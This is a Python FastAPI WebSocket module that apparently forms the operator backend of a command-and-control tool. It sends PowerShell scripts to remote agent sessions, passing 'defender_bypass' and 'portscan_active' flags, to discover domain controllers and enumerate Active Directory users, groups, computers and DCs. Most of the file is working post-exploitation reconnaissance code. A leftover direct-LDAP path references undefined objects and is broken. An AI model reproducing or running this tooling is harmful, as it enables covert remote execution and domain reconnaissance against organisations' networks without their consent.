# backend/websocket_ldap.py
from __future__ import annotations
import asyncio, json, uuid, time, traceback
from asyncio import CancelledError
from typing import Any, Dict, Optional, List, Tuple, Callable
from contextlib import suppress

from fastapi import APIRouter, WebSocket, WebSocketDisconnect
import jwt

from . import config
from .logutil import get_logger, bind, redacts

# Agent bridges (unchanged imports)
from core.session_handlers import session_manager
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

router = APIRouter()
logger = get_logger("backend.websocket_ldap", file_basename="ldap_ws")

# ---- ldap3 (sync) wrapped in threads so the event loop never blocks
WS_PING_INTERVAL_SEC = 20

# ldap3 not used; everything goes via agent
BASE = "BASE"; LEVEL = "LEVEL"; SUBTREE = "SUBTREE"  # dummies for type hints only

# ──────────────────────────────────────────────────────────────────────────────
# Logging policy (EXTREME: NO TRUNCATION)
# ──────────────────────────────────────────────────────────────────────────────
STRICT_NO_TRUNCATION = True
MAX_LOG_BYTES = 10_000_000  # only used if STRICT_NO_TRUNCATION = False

def _dump_json_full(obj: Any) -> str:
	try:
		return json.dumps(obj, ensure_ascii=False, default=str, separators=(",", ":"))
	except Exception:
		# Fall back to repr if it isn't JSON-serializable
		return repr(obj)

def _log_blob(name: str, blob: str | bytes, extra: Dict[str, Any]):
	if isinstance(blob, bytes):
		text = blob.decode("utf-8", errors="replace")
	else:
		text = str(blob)
	if not STRICT_NO_TRUNCATION and len(text) > MAX_LOG_BYTES:
		text = text[:MAX_LOG_BYTES] + f"... [+{len(text) - MAX_LOG_BYTES} bytes truncated]"
	logger.info(name, extra={**extra, "size": len(text), "data": text})

def _log_json(name: str, obj: Any, extra: Dict[str, Any]):
	text = _dump_json_full(obj)
	if not STRICT_NO_TRUNCATION and len(text) > MAX_LOG_BYTES:
		text = text[:MAX_LOG_BYTES] + f"... [+{len(text) - MAX_LOG_BYTES} bytes truncated]"
	logger.info(name, extra={**extra, "size": len(text), "json": text})

def _now() -> float:
	return time.perf_counter()

async def _to_thread(func: Callable, *a, **kw):
	return await asyncio.to_thread(func, *a, **kw)

async def _ws_send(ws: WebSocket, payload: Dict[str, Any], _log_wsid: str = ""):
	# Echo id if provided (request correlation)
	try:
		txt = _dump_json_full(payload)
		await ws.send_text(txt)
		_log_blob("ws.send", txt, extra={"type": payload.get("type"), "ok": payload.get("ok"), "wsid": _log_wsid})
		#_log_blob("ws.send", txt, extra={"type": payload.get("type"), "ok": payload.get("ok"), "wsid": log._context.get("wsid")})  # type: ignore[attr-defined]
	except WebSocketDisconnect:
		raise
	except Exception as e:
		logger.exception("ws.send.error", extra={"err": repr(e)})

def _ok(data: Dict[str, Any], t: str, req_id: Optional[str] = None) -> Dict[str, Any]:
	out = dict(data)
	out["type"] = t
	out["ok"] = True
	if req_id:
		out["id"] = req_id
	return out

def _err(t: str, msg: str, req_id: Optional[str] = None, **kw) -> Dict[str, Any]:
	out = {"type": t, "ok": False, "error": msg}
	if req_id:
		out["id"] = req_id
	out.update(kw)
	return out

# ──────────────────────────────────────────────────────────────────────────────
# Agent helpers
# ──────────────────────────────────────────────────────────────────────────────
def _resolve_sid(sid: str) -> str:
	try:
		if hasattr(session_manager, "resolve_sid"):
			return session_manager.resolve_sid(sid) or sid
	except Exception:
		pass
	return sid

def _psq(s: str) -> str:
	return "'" + str(s).replace("'", "''") + "'"

_PS_DISCOVER = """
$ErrorActionPreference='SilentlyContinue';$def=$null;$ncs=@();$dns=$null;$domain=$null;try{$domain=[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().Name}catch{};if(-not $domain){try{$domain=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name}catch{}};if(-not $domain){if($env:USERDNSDOMAIN){$domain=$env:USERDNSDOMAIN}};if(-not $domain){try{$p=Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters';$domain=@($p.Domain,$p.'NV Domain',$p.PrimaryDnsSuffix)|Where-Object{$_}|Select-Object -First 1}catch{}};try{$r=[ADSI]'LDAP://RootDSE';if($r){try{$def=$r.defaultNamingContext}catch{};try{$ncs=@($r.namingContexts)}catch{};try{$dns=$r.dnsHostName}catch{}}}catch{};if(-not $dns -and $domain){try{$o=& nltest /dsgetdc:$domain 2>$null;if($LASTEXITCODE -eq 0){foreach($line in $o){if($line -match 'Address:\\s+\\\\([^ \t]+)'){$dns=$Matches[1];break}elseif($line -match 'DC:\\s+\\\\([^ \t]+)'){$dns=$Matches[1];break}}}}catch{}};if(-not $dns -and $env:LOGONSERVER){try{$dns=$env:LOGONSERVER.TrimStart('\')}catch{}};if($dns){try{$r=[ADSI]('LDAP://'+$dns+'/RootDSE');if($r){if(-not $def){try{$def=$r.defaultNamingContext}catch{}};try{$ncs=@($r.namingContexts)}catch{};try{$h=$r.dnsHostName;if($h){$dns=$h}}catch{}}}catch{}};if(-not $domain -and $def){try{$domain=(($def -split ',\\s*'|ForEach-Object{$_ -replace '^DC=',''}) -join '.')}catch{}};[pscustomobject]@{ok=[bool]$dns;host=($dns -as [string]);port=389;domain=($domain -as [string]);defaultNamingContext=($def -as [string]);namingContexts=$ncs;dnsHostName=($dns -as [string])}|ConvertTo-Json -Compress -Depth 6
"""

def _ps_children(dn: str, size: int) -> str:
	return r"""$ErrorActionPreference='SilentlyContinue';$base=%s;$size=[int]%d;$de=New-Object System.DirectoryServices.DirectoryEntry(('LDAP://'+$base));$ds=New-Object System.DirectoryServices.DirectorySearcher($de);$ds.PageSize=$size;$ds.SearchScope=[System.DirectoryServices.SearchScope]::OneLevel;$ds.Filter='(objectClass=*)';$props=@('cn','name','ou','objectClass','hasSubordinates','numSubordinates','distinguishedName');foreach($p in $props){[void]$ds.PropertiesToLoad.Add($p)};$res=$ds.FindAll();$rows=@();foreach($r in $res){$dn=try{$r.Properties['distinguishedname'][0]}catch{$null};$attrs=@{};foreach($n in $r.Properties.PropertyNames){$attrs[$n]=@($r.Properties[$n])};$has=$false;if($attrs.ContainsKey('hasSubordinates')){$has=(''+$attrs['hasSubordinates'][0]) -in @('True','true','1')};if(-not $has -and $attrs.ContainsKey('numSubordinates')){$has=([int]$attrs['numSubordinates'][0]) -gt 0};if(-not $has){$oc=@();if($attrs.ContainsKey('objectClass')){$oc=$attrs['objectClass']|ForEach-Object{(''+$_).ToLower()}};foreach($k in @('organizationalunit','container','domain','builtin','computers','users','configuration')){if($oc -contains $k){$has=$true;break}}};$rows+=[pscustomobject]@{dn=$dn;rdn=if($dn){$dn.Split(',',2)[0]}else{''};attrs=$attrs;has_children=[bool]$has}};$rows|ConvertTo-Json -Compress -Depth 8""" % (_psq(dn), size)

def _ps_read(dn: str) -> str:
	# one-liner; avoids newline/brace issues in transports
	return r"""$ErrorActionPreference='SilentlyContinue';$dn=%s;try{$e=[ADSI]('LDAP://'+$dn);$a=@{};foreach($p in $e.Properties.PropertyNames){$a[$p]=@($e.Properties[$p])};$a|ConvertTo-Json -Compress -Depth 8}catch{'{"__err__":"read_failed"}'}""" % (_psq(dn),)

def _ps_search(base: str, scope: str, filt: str, size: int) -> str:
	scope_map = {
		"base": "[System.DirectoryServices.SearchScope]::Base",
		"one":  "[System.DirectoryServices.SearchScope]::OneLevel",
		"sub":  "[System.DirectoryServices.SearchScope]::Subtree",
	}
	ps_scope = scope_map.get(scope.lower(), "[System.DirectoryServices.SearchScope]::Subtree")
	return r"""$ErrorActionPreference='SilentlyContinue';$base=%s;$filt=%s;$size=[int]%d;$de=New-Object System.DirectoryServices.DirectoryEntry(('LDAP://'+$base));$ds=New-Object System.DirectoryServices.DirectorySearcher($de);$ds.Filter=$filt;$ds.SearchScope=%s;$ds.PageSize=$size;$res=$ds.FindAll();$rows=@();$i=0;foreach($r in $res){if($i -ge $size){break};$i++;$dn=try{$r.Properties['distinguishedname'][0]}catch{$null};$attrs=@{};foreach($n in $r.Properties.PropertyNames){$attrs[$n]=@($r.Properties[$n])};$rows+=[pscustomobject]@{dn=$dn;attrs=$attrs}};[pscustomobject]@{rows=$rows;cookie=''}|ConvertTo-Json -Compress -Depth 8""" % (_psq(base), _psq(filt), size, ps_scope)

def _run_remote_ps(sid: str, ps: str, timeout: float, op_id: str, log) -> str:
	sess = session_manager.sessions.get(sid)
	transport = (getattr(sess, "transport", "") or "").lower()
	_log_blob("ps.exec.script", ps, extra={"sid": redacts(sid, show=4), "transport": transport or "unknown", "timeout": timeout, "op": op_id})
	out = ""
	try:
		if transport in ("http", "https"):
			out = http_exec.run_command_http(sid, ps, op_id=op_id, timeout=timeout) or ""
		else:
			out = tcp_exec.run_command_tcp(
				sid,
				ps,
				timeout=timeout,
				defender_bypass=True,
				portscan_active=True,
				op_id=op_id,
			) or ""
	except Exception as e:
		logger.exception("ps.exec.error", extra={"sid": redacts(sid, show=4), "op": op_id, "err": repr(e)})
		out = ""
	_log_blob("ps.exec.stdout", out, extra={"sid": redacts(sid, show=4), "op": op_id})
	return out

# ──────────────────────────────────────────────────────────────────────────────
# WebSocket route
# ──────────────────────────────────────────────────────────────────────────────
@router.websocket("/ws/ldap")
async def ldap_ws(ws: WebSocket):
	await ws.accept()
	wsid = uuid.uuid4().hex[:8]
	client = None
	try:
		client = f"{ws.client.host}:{ws.client.port}"  # type: ignore[attr-defined]
	except Exception:
		pass
	log = bind(logger, wsid=wsid, client=client)
	log.info("ws.connect", extra={"path": "/ws/ldap", "client": client})

	WS_PING_INTERVAL_SEC = 20
	# Auth (token in query)
	token = ws.query_params.get("token")
	if not token:
		log.warning("ws.auth.missing_token"); await ws.close(code=1008); return
	try:
		jwt.decode(token, config.SECRET_KEY, algorithms=[config.ALGORITHM])
		log.info("ws.auth.ok", extra={"token": redacts(token, show=4)})
	except jwt.InvalidTokenError:
		log.warning("ws.auth.invalid"); await ws.close(code=1008); return

	# State
	conn: Optional[Connection] = None
	server: Optional[Server] = None
	use_agent: bool = False
	agent_sid: Optional[str] = None
	agent_info: Dict[str, Any] = {}
	default_sid = ws.query_params.get("sid") or ""
	is_alive = True

	# Heartbeat
	async def _pinger():
		"""
		Send a lightweight ping every WS_PING_INTERVAL_SEC seconds.
		Shuts down quietly on disconnect or task cancellation.
		"""
		try:
			while is_alive:
				try:
					await ws.send_text('{"type":"__ping__"}')
					logger.info("ws.ping", extra={"wsid": wsid})
				except Exception as e:
					# Socket likely closed; exit loop silently.
					logger.info("ws.ping.stop", extra={"wsid": wsid, "err": repr(e)})
					break
				try:
					await asyncio.sleep(WS_PING_INTERVAL_SEC)
				except CancelledError:
					break
		except CancelledError:
			# Task cancelled during shutdown; swallow.
			pass

	pinger_task = asyncio.create_task(_pinger())

	async def _close():
		nonlocal conn, server, use_agent, agent_sid, agent_info
		with suppress(Exception):
			if conn is not None:
				await _to_thread(conn.unbind)
		conn = None
		server = None
		use_agent = False
		agent_sid = None
		agent_info = {}

	# ── Open via AGENT (server-mode disabled)
	async def _handle_open(req: Dict[str, Any], req_id: Optional[str]):
		nonlocal use_agent, agent_sid, agent_info
		await _close()

		# Resolve agent SID from request or WS query (?sid=...)
		sid = _resolve_sid(req.get("sid") or default_sid or "")
		if not sid:
			await _ws_send(ws, _err("ldap.opened", "missing sid (agent-only mode)", req_id=req_id), _log_wsid=wsid)
			return

		# Discover DC on the agent
		out = _run_remote_ps(sid, _PS_DISCOVER, timeout=float(req.get("timeout", 10.0)), op_id="ldap", log=log)
		info: Dict[str, Any] = {}
		with suppress(Exception):
			raw = out.replace("\ufeff", "").strip()
			if "{" in raw:
				raw = raw[raw.index("{"):]
			info = json.loads(raw) if raw else {}

		_log_json("ldap.open_current.info", info, extra={"wsid": wsid, "sid": redacts(sid, show=4)})

		if not info or not (info.get("host") or info.get("defaultNamingContext")):
			await _ws_send(ws, _err("ldap.opened", "discovery returned no DC", req_id=req_id), _log_wsid=wsid)
			return

		# Flip into agent mode
		use_agent = True
		agent_sid = sid
		agent_info = dict(info or {})

		shaped = {
			"host": info.get("host") or "",
			"port": int(info.get("port") or 389),
			"use_ssl": False,
			"start_tls": False,
			"namingContexts": info.get("namingContexts") or ([] if not info.get("defaultNamingContext") else [info.get("defaultNamingContext")]),
			"defaultNamingContext": info.get("defaultNamingContext") or "",
			"dnsHostName": info.get("dnsHostName") or info.get("host") or "",
			"supportedLDAPVersion": [3],
		}
		await _ws_send(ws, _ok({"info": shaped}, "ldap.opened", req_id=req_id), _log_wsid=wsid)

	# ── Agent discovery
	async def _handle_discover(req: Dict[str, Any], req_id: Optional[str]):
		sid = _resolve_sid(req.get("sid") or default_sid or "")
		if not sid:
			await _ws_send(ws, _err("ldap.discovered", "missing sid", req_id=req_id), _log_wsid=wsid); return

		out = _run_remote_ps(sid, _PS_DISCOVER, timeout=float(req.get("timeout", 10.0)), op_id="ldap", log=log)
		data = {}
		with suppress(Exception):
			raw = out.replace("\ufeff", "").strip()
			if "{" in raw: raw = raw[raw.index("{"):]
			data = json.loads(raw) if raw else {}
		_log_json("ldap.discover.agent", data, extra={"wsid": wsid, "sid": redacts(sid, show=4)})
		await _ws_send(ws, _ok({"discover": data}, "ldap.discovered", req_id=req_id), _log_wsid=wsid)

	# ── Agent open current
	async def _handle_open_current(req: Dict[str, Any], req_id: Optional[str]):
		nonlocal use_agent, agent_sid, agent_info
		await _close()
		sid = _resolve_sid(req.get("sid") or default_sid or "")
		if not sid:
			await _ws_send(ws, _err("ldap.opened", "missing sid", req_id=req_id), _log_wsid=wsid); return
		out = _run_remote_ps(sid, _PS_DISCOVER, timeout=float(req.get("timeout", 10.0)), op_id="ldap", log=log)
		info = {}
		with suppress(Exception):
			raw = out.replace("\ufeff", "").strip()
			if "{" in raw: raw = raw[raw.index("{"):]
			info = json.loads(raw) if raw else {}
		_log_json("ldap.open_current.info", info, extra={"wsid": wsid, "sid": redacts(sid, show=4)})

		if not info or not (info.get("host") or info.get("defaultNamingContext")):
			await _ws_send(ws, _err("ldap.opened", "discovery returned no DC", req_id=req_id), log); return

		use_agent = True
		agent_sid = sid
		agent_info = dict(info or {})
		shaped = {
			"host": info.get("host") or "",
			"port": int(info.get("port") or 389),
			"use_ssl": False,
			"start_tls": False,
			"namingContexts": info.get("namingContexts") or ([] if not info.get("defaultNamingContext") else [info.get("defaultNamingContext")]),
			"defaultNamingContext": info.get("defaultNamingContext") or "",
			"dnsHostName": info.get("dnsHostName") or info.get("host") or "",
			"supportedLDAPVersion": [3],
		}
		await _ws_send(ws, _ok({"info": shaped}, "ldap.opened", req_id=req_id), _log_wsid=wsid)

	# ── RootDSE
	async def _handle_rootdse(req: Dict[str, Any], req_id: Optional[str]):
		if use_agent:
			sid = agent_sid or ""
			ps = r"$r=[ADSI]'LDAP://RootDSE'; $a=@{}; foreach($p in $r.Properties.PropertyNames){ $a[$p]=@($r.Properties[$p]) }; $a | ConvertTo-Json -Compress -Depth 8"
			out = _run_remote_ps(sid, ps, timeout=float(req.get("timeout", 10.0)), op_id="ldap", log=log)
			data = {}
			with suppress(Exception):
				data = json.loads(out) if (out or "").strip().startswith("{") else {}
			_log_json("ldap.rootdse.agent", data, extra={"wsid": wsid})
			await _ws_send(ws, _ok({"rootdse": data}, "ldap.rootdse", req_id=req_id), _log_wsid=wsid)
			return

		# server mode
		if conn is None:
			await _ws_send(ws, _err("ldap.rootdse", "not connected", req_id=req_id), log); return
		def _root():
			conn.search("", "(objectClass=*)", BASE, attributes=["*","+"])
			e = conn.entries[0] if conn.entries else None
			return e.entry_attributes_as_dict if e else {}
		data = await _to_thread(_root)
		_log_json("ldap.rootdse.server.full", data, extra={"wsid": wsid})
		await _ws_send(ws, _ok({"rootdse": data}, "ldap.rootdse", req_id=req_id), _log_wsid=wsid)

	# ── Read DN
	async def _handle_read(req: Dict[str, Any], req_id: Optional[str]):
		dn = str(req.get("dn") or "")
		if not dn:
			await _ws_send(ws, _err("ldap.read", "missing dn", req_id=req_id), log); return

		if use_agent:
			out = _run_remote_ps(agent_sid or "", _ps_read(dn), timeout=float(req.get("timeout", 10.0)), op_id="ldap", log=log)
			if (out or "").strip():
				with suppress(Exception):
					data = json.loads(out)
					if isinstance(data, dict) and data.get("__err__"):
						await _ws_send(ws, _err("ldap.read", data["__err__"], req_id=req_id, dn=dn), log); return
					_log_json("ldap.read.agent.attrs", data, extra={"wsid": wsid, "dn": dn})
					await _ws_send(ws, _ok({"dn": dn, "attrs": data or {}}, "ldap.read", req_id=req_id), _log_wsid=wsid); return
			await _ws_send(ws, _ok({"dn": dn, "attrs": {}}, "ldap.read", req_id=req_id), _log_wsid=wsid); return

		if conn is None:
			await _ws_send(ws, _err("ldap.children", "not connected", req_id=req_id), _log_wsid=wsid); return
		attrs = req.get("attrs") or ["*","+"]

		def _read() -> Tuple[Optional[str], Dict[str, Any]]:
			conn.search(dn, "(objectClass=*)", BASE, attributes=attrs)
			e = conn.entries[0] if conn.entries else None
			return (e.entry_dn if e else None), (e.entry_attributes_as_dict if e else {})

		_rdn, vals = await _to_thread(_read)
		_log_json("ldap.read.server.attrs", vals, extra={"wsid": wsid, "dn": dn})
		await _ws_send(ws, _ok({"dn": dn, "attrs": vals}, "ldap.read", req_id=req_id), _log_wsid=wsid)

	# ── Children (one level)
	async def _handle_children(req: Dict[str, Any], req_id: Optional[str]):
		dn = str(req.get("dn") or "")
		size = int(req.get("size") or 500)
		if not dn:
			await _ws_send(ws, _err("ldap.children", "missing dn", req_id=req_id), log); return

		if use_agent:
			out = _run_remote_ps(agent_sid or "", _ps_children(dn, size), timeout=float(req.get("timeout", 12.0)), op_id="ldap", log=log)
			rows: List[Dict[str, Any]] = []
			with suppress(Exception):
				if (out or "").strip().startswith("["):
					rows = json.loads(out)
			_log_json("ldap.children.agent.rows", rows, extra={"wsid": wsid, "dn": dn})
			await _ws_send(ws, _ok({"dn": dn, "children": rows}, "ldap.children", req_id=req_id), _log_wsid=wsid)
			return

		if conn is None:
			await _ws_send(ws, _err("ldap.children", "not connected", req_id=req_id), log); return

		attrs = list(set((req.get("attrs") or []) + [
			"cn","name","ou","objectClass","hasSubordinates","numSubordinates","distinguishedName"
	   ]))

		def _list_children() -> List[Dict[str, Any]]:
			# Use paged control at LEVEL scope so big OUs/containers work reliably
			gen = conn.extend.standard.paged_search(
				dn, "(objectClass=*)", search_scope=LEVEL, attributes=attrs,
				paged_size=max(1, min(size, 1000)), generator=True
			)
			rows: List[Dict[str, Any]] = []
			count = 0
			for entry in gen:
				et = entry.get("type")
				if et != "searchResEntry":
					continue
				ad = entry.get("attributes") or {}
				entry_dn = entry.get("dn") or ""

				# Heuristic: container-ish types count as having children
				has_sub = False
				with suppress(Exception):
					v = ad.get("hasSubordinates")
					if isinstance(v, list): v = v[0]
					has_sub = (str(v).lower() in ("true","1"))
				if not has_sub:
					with suppress(Exception):
						n = ad.get("numSubordinates")
						if isinstance(n, list): n = n[0]
						has_sub = int(n or 0) > 0
				if not has_sub:
					oc = [str(s).lower() for s in (ad.get("objectClass") or [])]
					if any(k in oc for k in ("organizationalunit","container","domain","builtin","computers","users","configuration")):
						has_sub = True
				rdn = (entry_dn.split(",", 1)[0] if entry_dn else "")
				rows.append({"dn": entry_dn, "rdn": rdn, "attrs": ad, "has_children": bool(has_sub)})
				count += 1
				if count >= size:
					break
			return rows

		rows = await _to_thread(_list_children)
		_log_json("ldap.children.server.rows", rows, extra={"wsid": wsid, "dn": dn})
		await _ws_send(ws, _ok({"dn": dn, "children": rows}, "ldap.children", req_id=req_id), _log_wsid=wsid)

	# ── Search (paged)
	async def _handle_search(req: Dict[str, Any], req_id: Optional[str]):
		base = str(req.get("base") or "")
		scope = str(req.get("scope", "sub")).lower()
		filt = str(req.get("filter") or "(objectClass=*)")
		attrs = req.get("attrs") or ["cn","name","objectClass","distinguishedName"]
		size = int(req.get("size", 500))

		if not base:
			await _ws_send(ws, _err("ldap.search.page", "missing base", req_id=req_id), _log_wsid=wsid); return

		if use_agent:
			out = _run_remote_ps(agent_sid or "", _ps_search(base, scope, filt, size), timeout=float(req.get("timeout", 12.0)), op_id="ldap", log=log)
			obj = {}
			with suppress(Exception):
				if (out or "").strip().startswith("{"):
					obj = json.loads(out)
			rows = obj.get("rows") or []
			next_cookie = obj.get("cookie") or ""
			_log_json("ldap.search.agent.rows", rows, extra={"wsid": wsid, "base": base})
			await _ws_send(ws, _ok({"base": base, "rows": rows, "cookie": next_cookie}, "ldap.search.page", req_id=req_id), _log_wsid=wsid)
			return

		if conn is None:
			await _ws_send(ws, _err("ldap.search.page", "not connected", req_id=req_id), _log_wsid=wsid); return

		sc_map = {"base": BASE, "one": LEVEL, "sub": SUBTREE}
		sc = sc_map.get(scope, SUBTREE)

		def _paged() -> Tuple[List[Dict[str, Any]], str]:
			res = conn.extend.standard.paged_search(
				base, filt, search_scope=sc, attributes=attrs,
				paged_size=max(1, size), generator=True
			)
			rows: List[Dict[str, Any]] = []
			next_cookie: str = ""
			for entry in res:
				et = entry.get("type")
				if et == "searchResEntry":
					dn = entry.get("dn")
					ad = entry.get("attributes") or {}
					rows.append({"dn": dn, "attrs": ad})
				elif et == "searchResDone":
					controls = entry.get("controls") or {}
					pr = controls.get("1.2.840.113556.1.4.319")
					if pr and "value" in pr and pr["value"]:
						ck = pr["value"].get("cookie")
						if isinstance(ck, (bytes, bytearray)):
							next_cookie = ck.decode("latin1", "ignore")
						else:
							next_cookie = ck or ""
					break
			return rows, next_cookie

		rows, next_cookie = await _to_thread(_paged)
		_log_json("ldap.search.server.rows", rows, extra={"wsid": wsid, "base": base, "cookie": next_cookie})
		await _ws_send(ws, _ok({"base": base, "rows": rows, "cookie": next_cookie}, "ldap.search.page", req_id=req_id), _log_wsid=wsid)

	# ── Quick categories (Users, Groups, OUs, Computers, DCs)
	async def _handle_quick(req: Dict[str, Any], req_id: Optional[str]):
		"""
		Returns a flat list of DNs for a category under a base (default: defaultNamingContext).
		"""
		kind = str(req.get("kind") or "").lower()
		base = str(req.get("base") or "") or (agent_info.get("defaultNamingContext") if use_agent else "")
		size = int(req.get("size") or 1000)
		if not base:
			await _ws_send(ws, _err("ldap.quick", "missing base", req_id=req_id, kind=kind), _log_wsid=wsid); return

		filt_map = {
			"users":      "(&(objectCategory=person)(objectClass=user))",
			"groups":     "(&(objectCategory=group)(objectClass=group))",
			"ous":        "(objectClass=organizationalUnit)",
			"computers":  "(objectClass=computer)",
			# userAccountControl bit 0x2000 (8192) => SERVER_TRUST_ACCOUNT (DC)
			"dcs":        "(userAccountControl:1.2.840.113556.1.4.803:=8192)",
		}
		filt = filt_map.get(kind)
		if not filt:
			await _ws_send(ws, _err("ldap.quick", f"bad kind: {kind}", req_id=req_id), _log_wsid=wsid); return

		# Agent path
		if use_agent:
			out = _run_remote_ps(agent_sid or "", _ps_search(base, "sub", filt, size), timeout=float(req.get("timeout", 12.0)), op_id="ldap", log=log)
			obj = {}
			with suppress(Exception):
				if (out or "").strip().startswith("{"):
					obj = json.loads(out)
			rows = obj.get("rows") or []
			shaped = [{"dn": r.get("dn")} for r in rows if r.get("dn")]
			_log_json("ldap.quick.agent.rows", shaped, extra={"wsid": wsid, "kind": kind, "base": base})
			await _ws_send(ws, _ok({"kind": kind, "rows": shaped}, "ldap.quick", req_id=req_id), _log_wsid=wsid)
			return

		# Server mode
		if conn is None:
			await _ws_send(ws, _err("ldap.quick", "not connected", req_id=req_id, kind=kind), _log_wsid=wsid); return

		def _do() -> List[Dict[str, Any]]:
			res = conn.extend.standard.paged_search(base, filt, search_scope=SUBTREE, attributes=[], paged_size=max(1, size), generator=True)
			rows: List[Dict[str, Any]] = []
			for entry in res:
				if entry.get("type") == "searchResEntry":
					rows.append({"dn": entry.get("dn")})
			return rows
		rows = await _to_thread(_do)
		_log_json("ldap.quick.server.rows", rows, extra={"wsid": wsid, "kind": kind, "base": base})
		await _ws_send(ws, _ok({"kind": kind, "rows": rows}, "ldap.quick", req_id=req_id), _log_wsid=wsid)

	# ── Main receive loop
	try:
		while True:
			raw = await ws.receive_text()
			_log_blob("ws.recv", raw, extra={"wsid": wsid})
			try:
				req = json.loads(raw)
			except Exception:
				await _ws_send(ws, _err("ldap.error", "bad json"), _log_wsid=wsid); continue

			act = str(req.get("action") or "").lower()
			req_id = req.get("id")

			# Light ping handling
			if act in ("ping", "__ping__", "health"):
				await _ws_send(ws, _ok({"ts": time.time()}, "pong", req_id=req_id), _log_wsid=wsid); continue

			if act == "ldap.open":
				await _handle_open(req, req_id)
			elif act == "ldap.open.current":
				await _handle_open_current(req, req_id)
			elif act == "ldap.discover":
				await _handle_discover(req, req_id)
			elif act == "ldap.close":
				await _close(); await _ws_send(ws, _ok({}, "ldap.closed", req_id=req_id), _log_wsid=wsid)
			elif act == "ldap.rootdse":
				await _handle_rootdse(req, req_id)
			elif act == "ldap.read":
				await _handle_read(req, req_id)
			elif act == "ldap.children":
				await _handle_children(req, req_id)
			elif act == "ldap.search":
				await _handle_search(req, req_id)
			elif act == "ldap.quick":
				await _handle_quick(req, req_id)
			else:
				await _ws_send(ws, _err("ldap.error", f"unknown action: {act}", req_id=req_id), _log_wsid=wsid)

	except WebSocketDisconnect:
		pass

	except CancelledError:
		# Route cancelled (e.g., server shutdown); ignore.
		pass

	except Exception as e:
		logger.exception("ws.loop.crash", extra={"wsid": wsid, "err": repr(e), "trace": traceback.format_exc()})

	finally:
		with suppress(Exception):
			await _close()
		# Stop heartbeat cleanly
		is_alive = False
		with suppress(Exception):
			pinger_task.cancel()
		# Await and swallow task cancellation
		with suppress(CancelledError):
			await pinger_task
		logger.info("ws.disconnect", extra={"wsid": wsid})

		"""try:
			await _close()
		finally:
			try:
				is_alive = False
				pinger_task.cancel()
				with suppress(Exception):
					await pinger_task
			finally:
				logger.info("ws.disconnect", extra={"wsid": wsid})"""
